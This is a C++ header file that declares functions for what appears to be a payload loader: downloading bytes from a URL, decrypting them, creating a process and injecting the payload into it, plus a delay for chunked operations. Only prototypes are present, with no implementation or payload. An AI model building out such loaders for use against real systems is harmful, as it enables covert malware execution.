#pragma once

#include <Windows.h>
#include <iostream>
#include <vector>

#define SLEEP_TIME 0 // delay for chunking ops


extern				std::vector<BYTE> svLocalPayload;
BOOL				Decrypt(BYTE* pbPayloadEncrypted, SIZE_T szPayloadEncryptedSize, BYTE* &pbPayloadDecrypted, SIZE_T &szPayloadDecryptedSize);
VOID				PrintHexData(PBYTE Data, SIZE_T Size);
BOOL				Inject(PBYTE pbPayload, SIZE_T szPayloadSize, HANDLE hProcess, PVOID &pPayloadAddress);
BOOL				Create(HANDLE &hProcess, HANDLE &hThread, DWORD &dwProcessId);
std::vector<BYTE>	Download(LPCWSTR fullUrl);
BOOL				Delay(DWORD dwSeconds);